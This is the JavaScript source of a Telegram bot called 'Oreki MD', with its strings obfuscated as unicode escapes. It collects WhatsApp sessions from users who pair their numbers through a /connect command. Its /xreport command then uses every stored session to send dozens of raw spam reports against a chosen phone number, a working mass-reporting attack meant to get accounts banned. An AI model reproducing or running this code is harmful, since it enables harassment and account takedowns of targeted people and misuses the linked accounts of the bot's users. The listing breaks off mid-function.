require("\u002e\u002f\u0073\u0065\u0074\u0074\u0069\u006e\u0067\u002f\u0063\u006f\u006e\u0066\u0069\u0067")
const fs = require("\u0066\u0073");
const {
    Telegraf,
    Context,
    Markup
} = require("\u0074\u0065\u006c\u0065\u0067\u0072\u0061\u0066")
const {
    message,
    editedMessage,
    channelPost,
    editedChannelPost,
    callbackQuery
} = require("\u0074\u0065\u006c\u0065\u0067\u0072\u0061\u0066\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u0073");
const path = require("\u0070\u0061\u0074\u0068");
const os = require("\u006f\u0073")
const yts = require("\u0079\u0074\u002d\u0073\u0065\u0061\u0072\u0063\u0068");
const { ytdl } = require("\u002e\u002f\u0061\u006c\u006c\u0066\u0075\u006e\u0063\u002f\u0073\u0063\u0072\u0061\u0070\u0065\u002d\u0079\u0074\u0064\u006c");
const startpairing = require("\u002e\u002f\u0070\u0061\u0069\u0072");
const { BOT_TOKEN } = require("\u002e\u002f\u0074\u006f\u006b\u0065\u006e");
    const adminFilePath = "\u002e\u002f\u0064\u0061\u0074\u0061\u0062\u0061\u0073\u0065\u002f\u0061\u0064\u006d\u0069\u006e\u0074\u0065\u006c\u0065\u002e\u006a\u0073\u006f\u006e";
const bannedPath = "\u002e\u002f\u0072\u0069\u0063\u0068\u0073\u0074\u006f\u0072\u0065\u002f\u0070\u0061\u0069\u0072\u0069\u006e\u0067\u002f\u0062\u0061\u006e\u006e\u0065\u0064\u002e\u006a\u0073\u006f\u006e";

const ITEMS_PER_PAGE = 10;
const pagedListPairs = {}; 

const botStartTime = Date.now();
const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("\u0040\u0077\u0068\u0069\u0073\u006b\u0065\u0079\u0073\u006f\u0063\u006b\u0065\u0074\u0073\u002f\u0062\u0061\u0069\u006c\u0065\u0079\u0073");
const { makeWASocket, useMultiFileAuthState } = require("\u0040\u0077\u0068\u0069\u0073\u006b\u0065\u0079\u0073\u006f\u0063\u006b\u0065\u0074\u0073\u002f\u0062\u0061\u0069\u006c\u0065\u0079\u0073");
const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, Header 
} = require("\u0040\u0077\u0068\u0069\u0073\u006b\u0065\u0079\u0073\u006f\u0063\u006b\u0065\u0074\u0073\u002f\u0062\u0061\u0069\u006c\u0065\u0079\u0073");

if (!fs.existsSync(adminFilePath)) {
  const defaultAdmin = [String(process.env.OWNER_ID || "\u0037\u0039\u0032\u0031\u0030\u0039\u0035\u0031\u0030\u0033")]; 

  fs.writeFileSync(adminFilePath, JSON.stringify(defaultAdmin, null, 2));
}

const userStore = "\u002e\u002f\u0072\u0069\u0063\u0068\u0073\u0074\u006f\u0072\u0065\u002f\u0070\u0061\u0069\u0072\u0069\u006e\u0067\u002f\u0075\u0073\u0065\u0072\u0073\u002e\u006a\u0073\u006f\u006e";

function trackUser(id) {
  const users = JSON.parse(fs.readFileSync(userStore));
  if (!users.includes(id)) {
    users.push(id);
    fs.writeFileSync(userStore, JSON.stringify(users, null, 2));
  }
}
const adminIDs = JSON.parse(fs.readFileSync(adminFilePath, "\u0075\u0074\u0066\u0038"));
const bot = new Telegraf(BOT_TOKEN);
const premium_file = "\u002e\u002f\u0070\u0072\u0065\u006d\u0069\u0075\u006d\u002e\u006a\u0073\u006f\u006e";
let premiumUsers = [];

try {
  if (fs.existsSync(premium_file)) {
    premiumUsers = JSON.parse(fs.readFileSync(premium_file, "\u0075\u0074\u0066\u002d\u0038"));
  } else {
    fs.writeFileSync(premium_file, JSON.stringify([]));
  }
} catch (error) {
  console.error("\u0046\u0061\u0069\u006c\u0065\u0064\u0020\u0074\u006f\u0020\u006c\u006f\u0061\u0064\u0020\u0070\u0072\u0065\u006d\u0069\u0075\u006d\u0020\u0075\u0073\u0065\u0072\u0073\u003a", error);
}
const userStates = {};
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function getPushName(ctx) {
  return ctx.from.first_name || ctx.from.username || "\u0055\u0073\u0065\u0072";
}
function sendListPairPage(ctx, userID, pageIndex) {
  const pairedDevices = pagedListPairs[userID] || [];
  const totalPages = Math.max(1, Math.ceil(pairedDevices.length / ITEMS_PER_PAGE));

  

  pageIndex = Math.min(Math.max(pageIndex, 0), totalPages - 1);

  const start = pageIndex * ITEMS_PER_PAGE;
  const currentPage = pairedDevices.slice(start, start + ITEMS_PER_PAGE);

  const pageText = currentPage.length
    ? currentPage.map((id, i) => `*${start + i + 1}.* \`ID:\` ${id}`).join("\n")
    : "\u005f\u004e\u006f\u0020\u0070\u0061\u0069\u0072\u0065\u0064\u0020\u0064\u0065\u0076\u0069\u0063\u0065\u0073\u0020\u0066\u006f\u0075\u006e\u0064\u002e\u005f";

  const navButtons = [];
  if (pageIndex > 0) navButtons.push({ text: "\u2b05\ufe0f\u0020\u0042\u0061\u0063\u006b", callback_data: `listpair_page_${pageIndex - 1}` });
  if (pageIndex < totalPages - 1) navButtons.push({ text: "\u27a1\ufe0f\u0020\u004e\u0065\u0078\u0074", callback_data: `listpair_page_${pageIndex + 1}` });

  const text = `*Paired Bots (Page ${pageIndex + 1}/${totalPages}):*\n\n${pageText}`;

  

  ctx.editMessageText(text, {
    parse_mode: "\u004d\u0061\u0072\u006b\u0064\u006f\u0077\u006e",
    reply_markup: { inline_keyboard: navButtons.length ? [navButtons] : [] }
  }).catch(() => {
    ctx.reply(text, {
      parse_mode: "\u004d\u0061\u0072\u006b\u0064\u006f\u0077\u006e",
      reply_markup: { inline_keyboard: navButtons.length ? [navButtons] : [] }
    });
  });
}
function sendDelPairPage(ctx, userID, pageIndex) {
  const pairedDevices = pagedListPairs[userID] || [];
  const totalPages = Math.max(1, Math.ceil(pairedDevices.length / ITEMS_PER_PAGE));

  

  pageIndex = Math.min(Math.max(pageIndex, 0), totalPages - 1);

  const start = pageIndex * ITEMS_PER_PAGE;
  const currentPage = pairedDevices.slice(start, start + ITEMS_PER_PAGE);

  const keyboard = currentPage.map(id => [
    { text: `🗑️ ${id}`, callback_data: `delpair_${id}` }
  ]);

  const navButtons = [];
  if (pageIndex > 0) navButtons.push({ text: "\u2b05\ufe0f\u0020\u0042\u0061\u0063\u006b", callback_data: `delpair_page_${pageIndex - 1}` });
  if (pageIndex < totalPages - 1) navButtons.push({ text: "\u27a1\ufe0f\u0020\u004e\u0065\u0078\u0074", callback_data: `delpair_page_${pageIndex + 1}` });

  if (navButtons.length) keyboard.push(navButtons);

  const text = pairedDevices.length
    ? `Delete Paired Devices (Page ${pageIndex + 1}/${totalPages}):\n\nTap a device ID to delete.`
    : "\u005f\u004e\u006f\u0020\u0070\u0061\u0069\u0072\u0065\u0064\u0020\u0064\u0065\u0076\u0069\u0063\u0065\u0073\u0020\u0066\u006f\u0075\u006e\u0064\u002e\u005f";

  ctx.deleteMessage().catch(() => {});
  ctx.reply(text, {
    parse_mode: "\u004d\u0061\u0072\u006b\u0064\u006f\u0077\u006e",
    reply_markup: { inline_keyboard: keyboard }
  });
}
function formatRuntime(seconds) {
  const pad = (s) => (s < 10 ? "\u0030" + s : s);
  const hrs = Math.floor(seconds / 3600);
  const mins = Math.floor((seconds % 3600) / 60);
  const secs = Math.floor(seconds % 60);
  return `${pad(hrs)}h ${pad(mins)}m ${pad(secs)}s`;
}
bot.command("\u0072\u0075\u006e\u0074\u0069\u006d\u0065", async (ctx) => {
  const uptime = Math.floor((Date.now() - botStartTime) / 1000);
  ctx.reply(`ᴏʀᴇᴋɪ ᴍᴅ ɪs ᴏɴʟɪɴᴇ ғᴏʀ *${formatRuntime(uptime)}*`, {
    parse_mode: "\u004d\u0061\u0072\u006b\u0064\u006f\u0077\u006e"
  });
});
bot.start((ctx) => {
  const userId = ctx.from.id;
  trackUser(userId); 

ctx.reply("\u1d04\u029f\u026a\u1d04\u1d0b\u0020\u1d1b\u029c\u1d07\u0020\u0299\u1d1c\u1d1b\u1d1b\u1d0f\u0274\u0020\u0299\u1d07\u029f\u1d0f\u1d21\u0020\u1d1b\u1d0f\u0020\u0073\u1d1b\u1d00\u0280\u1d1b\u0020\u1d1b\u029c\u1d07\u0020\u1d0f\u0280\u1d07\u1d0b\u026a\u0020\u1d0d\u1d05", {
  reply_markup: {
    inline_keyboard: [
      [
        { text: "\u0073\u1d1b\u1d00\u0280\u1d1b\u0020\u1d0f\u0280\u1d07\u1d0b\u026a\u0020\u1d67c\u1d673", callback_data: "\u0073\u0074\u0061\u0072\u0074\u005f\u0062\u006f\u0074" }
      ]
    ]
  }
});
});
bot.action("\u0073\u0074\u0061\u0072\u0074\u005f\u0062\u006f\u0074", async (ctx) => {
  const pushname = getPushName(ctx);
  const photoUrl = "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0063\u002e\u0074\u006f\u0070\u0034\u0074\u006f\u0070\u002e\u0069\u006f\u002f\u0070\u005f\u0033\u0038\u0032\u0035\u006c\u0077\u006e\u006a\u0067\u0030\u002e\u0070\u006e\u0067";
  const captionText =`
╭『🍙 𝗢𝗥𝗘𝗞𝗜 𝗠𝗗 | 攻撃 -Iɴғᴏ 』

╭━━━ 「 ᴏʀᴇᴋɪ ᴍᴅ ʙᴏᴛ 」 ━━━━┈⟫⟫
┃
┃ ❏  ʙᴏᴛ ɴᴀᴍᴇ    : ᴏʀᴇᴋɪ ᴍᴅ ʙᴏᴛ
┃ ❏  ᴄᴏʀᴇ ᴛʏᴘᴇ   : ᴄᴏʀᴇ ᴄᴏɴᴛʀᴏʟʟᴇʀ
┃ ❏  ʀᴏʟᴇ         : Muli devices bot
┃ ❏  ᴅᴇᴠᴇʟᴏᴘᴇʀ   : ᴋɪʀᴀ dev 🇦🇱
┃
┣━ ◇ ᴏʀᴇᴋɪ ᴍᴅ ᴄᴏᴍᴍᴀɴᴅs ◇ ━━┈⟫⟫
┃ ❏  /connect     → ʙɪɴᴅ ɴᴇᴡ ᴅᴇᴠɪᴄᴇ
┃ ❏  /delpair      → sᴇᴠᴇʀ ʟɪɴᴋ
┃ ❏  /listpair      → ᴠɪᴇᴡ ʙᴏᴜɴᴅ ɴᴏᴅᴇs
┃ ❏  /listmode    → sʏsᴛᴇᴍ ᴄᴏɴᴛʀᴏʟ ᴍᴏᴅᴇ
┃ ❏  /runtime     → ᴄᴏʀᴇ ᴜᴘᴛɪᴍᴇ
┃ ❏  /xreport      → ᴇxᴇᴄ ᴜᴛɪʟɪᴛʏ ʀᴇᴘᴏʀᴛ
╰━━━━━━━━━━━━━━━━━━━━━━━━┈⟫⟫

**ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋɪʀᴀ dev**`;
    
  const buttons = Markup.inlineKeyboard([
    [
      Markup.button.url("\u0262\u0280\u1d0f\u1d1c\u1d18", "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0074\u002e\u006d\u0065\u002f\u004b\u0049\u0052\u0041\u0034\u0048\u0055\u0042"),
      Markup.button.url("\u1d04\u029c\u1d00\u0274\u0274\u1d07\u029f", "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0074\u002e\u006d\u0065\u002f\u004b\u0049\u0052\u0041\u0048\u0055\u0042\u0032")
      
    ]
  ]);

  try {
    await ctx.sendChatAction("\u0075\u0070\u006c\u006f\u0061\u0064\u005f\u0070\u0068\u006f\u0074\u006f");
    await ctx.replyWithPhoto(photoUrl, {
      caption: captionText,
      parse_mode: "\u0048\u0054\u004d\u004c",
      ...buttons
    });
  } catch (err) {
    console.error("\u0049\u006d\u0061\u0067\u0065\u0020\u0066\u0061\u0069\u006c\u0065\u0064\u0020\u0074\u006f\u0020\u006c\u006f\u0061\u0064\u002c\u0020\u0073\u0065\u006e\u0064\u0069\u006e\u0067\u0020\u0066\u0061\u006c\u006c\u0062\u0061\u0063\u006b\u0020\u0074\u0065\u0078\u0074\u003a", err);
    await ctx.reply(`${captionText}`, {
      parse_mode: "\u0048\u0054\u004d\u004c",
      ...buttons
    });
  }
});
bot.command("\u0063\u006f\u006e\u006e\u0065\u0063\u0074", async (ctx) => {
  try {
    const userId = ctx.from.id;

    const channelUsernames = ["\u0040\u004b\u0049\u0052\u0041\u0034\u0048\u0055\u0042","\u0040\u004b\u0049\u0052\u0041\u0048\u0055\u0042\u0032"]; 

    let joinedAllChannels = true;
    for (const channel of channelUsernames) {
      try {
        const member = await ctx.telegram.getChatMember(channel, userId);
        if (["\u006c\u0065\u0066\u0074", "\u006b\u0069\u0063\u006b\u0065\u0064"].includes(member.status)) {
          joinedAllChannels = false;
          break;
        }
      } catch (e) {
        joinedAllChannels = false;
        break;
      }
    }

    if (!joinedAllChannels) {
      return ctx.reply(
        `ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ ᴛᴏ ᴄᴏᴍᴍᴇɴᴄᴇ ʙᴏᴛ ᴘᴀɪʀɪɴɢ ᴘʀᴏᴄᴇss.`,
        {
          parse_mode: "\u004d\u0061\u0072\u006b\u0064\u006f\u0077\u006e",
          reply_markup: {
            inline_keyboard: [
              [{ text: "\u1d0a\u1d0f\u026a\u0274\u0020\u1d04\u029c\u1d00\u0274\u0274\u1d07\u029f", url: "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0074\u002e\u006d\u0065\u002f\u004b\u0049\u0052\u0041\u0034\u0048\u0055\u0042" }],
              [{ text: "\u1d0a\u1d0f\u026a\u0274\u0020\u1d04\u029c\u1d00\u0274\u0274\u1d07\u029f", url: "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0074\u002e\u006d\u0065\u002f\u004b\u0049\u0052\u0041\u0048\u0055\u0042\u0032" }],
              [{ text: "\u1d04\u1d0f\u0274\u0493\u026a\u0280\u1d0d", callback_data: "\u0063\u0068\u0065\u0063\u006b\u005f\u006a\u006f\u0069\u006e" }]
            ]
          }
        }
      );
    }

    const text = ctx.message.text.split("\u0020")[1];
    if (!text) {
      return ctx.reply("\u0054\u006f\u0020\u0070\u0072\u006f\u0063\u0065\u0065\u0064\u0020\u0070\u006c\u007a\u0020\u0065\u006e\u0074\u0065\u0072\u0020\u0061\u0020\u0070\u0068\u006f\u006e\u0065\u0020\u006e\u0075\u006d\u0062\u0065\u0072\u0020\u0069\u006e\u0020\u0074\u0068\u0065\u0020\u0066\u006f\u0072\u006d\u0061\u0074\u003a\u0020\u002f\u0063\u006f\u006e\u006e\u0065\u0063\u0074\u0020\u0031\u0032\u0033\u0078\u0078\u0078\u0078\u0078\u0078\u0078\u0078", { parse_mode: "\u004d\u0061\u0072\u006b\u0064\u006f\u0077\u006e" });
    }

    if (/[a-z]/i.test(text)) {
      return ctx.reply("\u0050\u006c\u0065\u0061\u0073\u0065\u0020\u0065\u006e\u0074\u0065\u0072\u0020\u0061\u0020\u0076\u0061\u006c\u0069\u0064\u0020\u0070\u0068\u006f\u006e\u0065\u0020\u006e\u0075\u006d\u0062\u0065\u0072\u002e");
    }

    if (!/^\d{7,15}(\|\d{1,10})?$/.test(text)) {
      return ctx.reply("\u0045\u006e\u0074\u0065\u0072\u0020\u006e\u0075\u006d\u0062\u0065\u0072\u0020\u0069\u006e\u0020\u0074\u0068\u0069\u0073\u0020\u0066\u006f\u0072\u006d\u0061\u0074\u003a\u0020\u0031\u0032\u0033\u0078\u0078\u0078\u0078\u0078\u0078\u0028\u006e\u0075\u006d\u0062\u0065\u0072\u0073\u0020\u006f\u006e\u006c\u0079\u002c\u0020\u006e\u006f\u0020\u0073\u0079\u006d\u0062\u006f\u006c\u0073\u0020\u006f\u0072\u0020\u006c\u0065\u0074\u0074\u0065\u0072\u0073\u274c\u0029", { parse_mode: "\u004d\u0061\u0072\u006b\u0064\u006f\u0077\u006e" });
    }

    if (text.startsWith("\u0030")) {
      return ctx.reply("\u0050\u006c\u0065\u0061\u0073\u0065\u0020\u0075\u0073\u0065\u0020\u0061\u0020\u0064\u0069\u0066\u0066\u0065\u0072\u0065\u006e\u0074\u0020\u006e\u0075\u006d\u0062\u0065\u0072\u0020\u0066\u006f\u0072\u006d\u0061\u0074\u002e");
    }

    const target = text.split("\u007c")[0];
    const Xreturn = ctx.message.reply_to_message
      ? ctx.message.reply_to_message.from.id
      : target.replace(/[^0-9]/g, "") + "\u0040\u0073\u002e\u0077\u0068\u0061\u0074\u0073\u0061\u0070\u0070\u002e\u006e\u0065\u0074";

    if (!Xreturn) {
      return ctx.reply("\u0054\u0068\u0069\u0073\u0020\u006e\u0075\u006d\u0062\u0065\u0072\u0020\u0069\u0073\u0020\u006e\u006f\u0074\u0020\u0072\u0065\u0067\u0069\u0073\u0074\u0065\u0072\u0065\u0064\u0020\u006f\u006e\u0020\u0057\u0068\u0061\u0074\u0073\u0041\u0070\u0070");
    }

    const countryCode = text.slice(0, 3);
    const prefixxx = text.slice(0, 1);
    if (["\u0032\u0035\u0032", "\u0032\u0030\u0031", "\u002e", "\u0030"].includes(countryCode) || prefixxx === "\u0030") {
      return ctx.reply("\u0053\u006f\u0072\u0072\u0079\u002c\u0020\u006e\u0075\u006d\u0062\u0065\u0072\u0073\u0020\u0077\u0069\u0074\u0068\u0020\u0074\u0068\u0069\u0073\u0020\u0063\u006f\u0075\u006e\u0074\u0072\u0079\u0020\u0063\u006f\u0064\u0065\u0020\u006f\u0072\u0020\u0070\u0072\u0065\u0066\u0069\u0078\u0020\u0061\u0072\u0065\u0020\u006e\u006f\u0074\u0020\u0073\u0075\u0070\u0070\u006f\u0072\u0074\u0065\u0064\u002e");
    }
    
const pairingFolder = "\u002e\u002f\u0072\u0069\u0063\u0068\u0073\u0074\u006f\u0072\u0065\u002f\u0070\u0061\u0069\u0072\u0069\u006e\u0067";
const pairedUsersFromJson = fs.readdirSync(pairingFolder).filter(file => file.endsWith("\u0040\u0073\u002e\u0077\u0068\u0061\u0074\u0073\u0061\u0070\u0070\u002e\u006e\u0065\u0074")).length;
if (pairedUsersFromJson >= 70) {
  return ctx.reply(`**Pairing Limit Reached Contact The owner to create more servers 📡**`);
}
    const startpairing = require("\u002e\u002f\u0070\u0061\u0069\u0072\u002e\u006a\u0073");
    await ctx.reply(
      `PAIR REQUEST\n\n│ STATUS  : Request sent ⏳\n│ NUMBER  : ${target}\n│ CODE    : Waiting for the valid WhatsApp code...\n\nThe code will be sent automatically when WhatsApp generates it.`
    );

    

    

    await startpairing(Xreturn, async (pairingCode) => {
      await ctx.reply(
        `PAIR REQUEST\n\n` +
        `│ STATUS  : Valid code generated ✅\n` +
        `│ NUMBER  : ${target}\n` +
        `│ CODE    : ${pairingCode}\n` +
        `│ EXPIRES : shortly\n\n` +
        `Open WhatsApp → Linked devices → Link a device → Link with phone number instead, then enter this code.`
      );
    });
  } catch (error) {
    console.error("\u0045\u0072\u0072\u006f\u0072\u0020\u0069\u006e\u0020\u0070\u0061\u0069\u0072\u0020\u0063\u006f\u006d\u006d\u0061\u006e\u0064\u003a", error);
    ctx.reply("\u0041\u006e\u0020\u0065\u0072\u0072\u006f\u0072\u0020\u006f\u0063\u0063\u0075\u0072\u0072\u0065\u0064\u0020\u0077\u0068\u0069\u006c\u0065\u0020\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u0069\u006e\u0067\u0020\u0079\u006f\u0075\u0072\u0020\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e");
  }
});
bot.action("\u0063\u0068\u0065\u0063\u006b\u005f\u006a\u006f\u0069\u006e", async (ctx) => {
  const channelUsernames = ["\u0040\u004b\u0049\u0052\u0041\u0034\u0048\u0055\u0042","\u0040\u004b\u0049\u0052\u0041\u0048\u0055\u0042\u0032"];
  const userId = ctx.from.id;
  let joinedAllChannels = true;

  for (const channel of channelUsernames) {
    try {
      const member = await ctx.telegram.getChatMember(channel, userId);
      if (["\u006c\u0065\u0066\u0074", "\u006b\u0069\u0063\u006b\u0065\u0064"].includes(member.status)) {
        joinedAllChannels = false;
        break;
      }
    } catch (e) {
      joinedAllChannels = false;
      break;
    }
  }

  if (joinedAllChannels) {
    ctx.reply("\u0059\u006f\u0075\u2019\u0076\u0065\u0020\u0073\u0075\u0063\u0063\u0065\u0073\u0073\u0066\u0075\u006c\u006c\u0079\u0020\u006a\u006f\u0069\u006e\u0065\u0064\u0020\u006f\u0075\u0072\u0020\u0063\u0068\u0061\u006e\u006e\u0065\u006c\u0020\u1f389\u002e");
  } else {
    ctx.answerCbQuery("\u0059\u006f\u0075\u0020\u0068\u0061\u0076\u0065\u006e\u2019\u0074\u0020\u006a\u006f\u0069\u006e\u0065\u0064\u0020\u0079\u0065\u0074\u0020\u0070\u006c\u0073\u0020\u0064\u006f\u002e", { show_alert: true });
  }
});
bot.command("\u006c\u0069\u0073\u0074\u0070\u0061\u0069\u0072", async (ctx) => {
  const userID = ctx.from.id.toString();

  if (!adminIDs.includes(userID)) {
    return ctx.reply(`Unauthorized access.This command is restricted.`);
  }

  const pairingPath = "\u002e\u002f\u0072\u0069\u0063\u0068\u0073\u0074\u006f\u0072\u0065\u002f\u0070\u0061\u0069\u0072\u0069\u006e\u0067";
  if (!fs.existsSync(pairingPath)) return ctx.reply("\u004e\u006f\u0020\u0070\u0061\u0069\u0072\u0065\u0064\u0020\u0064\u0065\u0076\u0069\u0063\u0065\u0073\u0020\u0066\u006f\u0075\u006e\u0064\u002e");

  const entries = fs.readdirSync(pairingPath, { withFileTypes: true });
  const pairedDevices = entries.filter(entry => entry.isDirectory()).map(entry => entry.name);

  if (pairedDevices.length === 0) return ctx.reply("\u004e\u006f\u0020\u0070\u0061\u0069\u0072\u0065\u0064\u0020\u0064\u0065\u0076\u0069\u0063\u0065\u0073\u0020\u0066\u006f\u0075\u006e\u0064\u002e");

  pagedListPairs[userID] = pairedDevices;
  sendListPairPage(ctx, userID, 0);
});
bot.command("\u0064\u0065\u006c\u0075\u0073\u0065\u0072", async (ctx) => {
  const userID = ctx.from.id.toString();

  if (!adminIDs.includes(userID)) {
    return ctx.reply(`Unauthorized access.This command is restricted.`);
  }

  const pairingPath = "\u002e\u002f\u0072\u0069\u0063\u0068\u0073\u0074\u006f\u0072\u0065\u002f\u0070\u0061\u0069\u0072\u0069\u006e\u0067";
  if (!fs.existsSync(pairingPath)) return ctx.reply("\u004e\u006f\u0020\u0070\u0061\u0069\u0072\u0065\u0064\u0020\u0064\u0065\u0076\u0069\u0063\u0065\u0073\u0020\u0066\u006f\u0075\u006e\u0064\u002e");

  const entries = fs.readdirSync(pairingPath, { withFileTypes: true });
  const pairedDevices = entries.filter(entry => entry.isDirectory()).map(entry => entry.name);

  if (pairedDevices.length === 0) return ctx.reply("\u004e\u006f\u0020\u0070\u0061\u0069\u0072\u0065\u0064\u0020\u0064\u0065\u0076\u0069\u0063\u0065\u0073\u0020\u0066\u006f\u0075\u006e\u0064\u002e");

  pagedListPairs[userID] = pairedDevices;
  sendDelPairPage(ctx, userID, 0);
});
bot.command("\u0062\u0072\u006f\u0061\u0064\u0063\u0061\u0073\u0074", async (ctx) => {
  const senderId = ctx.from.id;
  const message = ctx.message.text.split("\u0020").slice(1).join("\u0020");

  if (!adminIDs.includes(senderId.toString())) {
    return ctx.reply("\u0055\u006e\u0061\u0075\u0074\u0068\u006f\u0072\u0069\u007a\u0065\u0064\u0020\u0061\u0063\u0063\u0065\u0073\u0073\u002e\u0054\u0068\u0069\u0073\u0020\u0063\u006f\u006d\u006d\u0061\u006e\u0064\u0020\u0069\u0073\u0020\u0072\u0065\u0073\u0074\u0072\u0069\u0063\u0074\u0065\u0064\u002e");
  }

  if (!message) {
    return ctx.reply("\u0050\u006c\u0065\u0061\u0073\u0065\u0020\u0070\u0072\u006f\u0076\u0069\u0064\u0065\u0020\u0061\u0020\u006d\u0065\u0073\u0073\u0061\u0067\u0065\u0020\u0074\u006f\u0020\u0062\u0072\u006f\u0061\u0064\u0063\u0061\u0073\u0074\u002e\n\u0055\u0073\u0061\u0067\u0065\u003a\u0020\u002f\u0062\u0072\u006f\u0061\u0064\u0063\u0061\u0073\u0074\u0020\u0048\u0065\u006c\u006c\u006f\u0020\u0075\u0073\u0065\u0072\u0073\u0021");
  }

  const users = JSON.parse(fs.readFileSync("\u002e\u002f\u0072\u0069\u0063\u0068\u0073\u0074\u006f\u0072\u0065\u002f\u0070\u0061\u0069\u0072\u0069\u006e\u0067\u002f\u0075\u0073\u0065\u0072\u0073\u002e\u006a\u0073\u006f\u006e"));

  let success = 0;
  let failed = 0;

  for (const userId of users) {
    try {
      await ctx.telegram.sendMessage(userId, `Broadcast Message: \n\n${message}`, {
        parse_mode: "\u004d\u0061\u0072\u006b\u0064\u006f\u0077\u006e"
      });
      success++;
    } catch {
      failed++;
    }
  }

  ctx.reply(`Broadcast complete.\n\nSuccess: ${success}\nFailed: ${failed}`);
});

bot.command("\u0078\u0072\u0065\u0070\u006f\u0072\u0074", async (ctx) => {
  const args = ctx.message.text.split("\u0020").slice(1);
  if (args.length === 0) {
    return ctx.reply("\u0055\u0073\u0061\u0067\u0065\u003a\u0020\u002f\u0078\u0072\u0065\u0070\u006f\u0072\u0074\u0020\u0031\u0032\u0033\u0078\u0078\u0078\u0078\u0078\u0078\u0078\u0078");
  }

  const targetNumber = args[0].replace(/\D/g, "");
  if (!targetNumber) {
    return ctx.reply("\u0049\u006e\u0076\u0061\u006c\u0069\u0064\u0020\u006e\u0075\u006d\u0062\u0065\u0072\u002e\u0020\u0055\u0073\u0065\u0020\u0064\u0069\u0067\u0069\u0074\u0073\u0020\u006f\u006e\u006c\u0079\u002e");
  }

  const targetJid = jidNormalizedUser(`${targetNumber}@s.whatsapp.net`);
  const pairingPath = "\u002e\u002f\u0072\u0069\u0063\u0068\u0073\u0074\u006f\u0072\u0065\u002f\u0070\u0061\u0069\u0072\u0069\u006e\u0067";

  if (!fs.existsSync(pairingPath)) {
    return ctx.reply("\u004e\u006f\u0020\u0061\u0063\u0074\u0069\u0076\u0065\u0020\u0070\u0061\u0069\u0072\u0065\u0064\u0020\u0064\u0065\u0076\u0069\u0063\u0065\u0073\u0020\u0066\u006f\u0075\u006e\u0064\u002e");
  }

  

  const sessions = fs.readdirSync(pairingPath, { withFileTypes: true })
                     .filter(entry => entry.isDirectory())
                     .map(entry => path.join(pairingPath, entry.name));

  if (sessions.length === 0) {
    return ctx.reply("\u004e\u006f\u0020\u0061\u0063\u0074\u0069\u0076\u0065\u0020\u0057\u0068\u0061\u0074\u0073\u0041\u0070\u0070\u0020\u0073\u0065\u0073\u0073\u0069\u006f\u006e\u0073\u0020\u0074\u006f\u0020\u0070\u0065\u0072\u0066\u006f\u0072\u006d\u0020\u0072\u0065\u0070\u006f\u0072\u0074\u002e");
  }

  ctx.reply(
    `🚨 Starting *mass-report* on +${targetNumber} using ${sessions.length} paired bots...`,
    { parse_mode: "\u004d\u0061\u0072\u006b\u0064\u006f\u0077\u006e" }
  );

  for (const sessionPath of sessions) {
    try {
      const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

      const rich = makeWASocket({ auth: state });
      rich.ev.on("\u0063\u0072\u0065\u0064\u0073\u002e\u0075\u0070\u0064\u0061\u0074\u0065", saveCreds);

      for (let i = 0; i < 30; i++) {
        try {
          await rich.ws.sendNode({
            tag: "\u0069\u0071",
            attrs: { to: "\u0073\u002e\u0077\u0068\u0061\u0074\u0073\u0061\u0070\u0070\u002e\u006e\u0065\u0074", type: "\u0073\u0065\u0074", xmlns: "\u0077\u003a\u0072\u0065\u0070\u006f\u0072\u0074" },
            content: [
              {
                tag: "\u0072\u0065\u0070\u006f\u0072\u0074",
                attrs: { to: targetJid, type: "\u0073\u0070\u0061\u006d", id: rich.generateMessageTag() },
                content: []
              }
            ]
          });
          console.log(`✅ Report ${i + 1} sent from ${path.basename(sessionPath)}`);
          await sleep(2000);
        } catch (err) {
          console.error(`❌ Report attempt ${i + 1} failed for ${path.basename(sessionPath)}:`, err.message);
        }
      }
    } catch (err) {
      console.error(`❌ Error with session ${path.basename(sessionPath)}:`, err.message);
    }
  }

  ctx.reply(
    `✅ Finished sending reports on *${targetNumber}*`,
    { parse_mode: "\u004d\u0061\u0072\u006b\u0064\u006f\u0077\u006e" }
  );
});
bot.command("\u0064\u0065\u006c\u0070\u0061\u0069\u0072", async (ctx) => {
  const text = ctx.message.text.trim();
  const args = text.split("\u0020").slice(1);

  if (args.length === 0) {
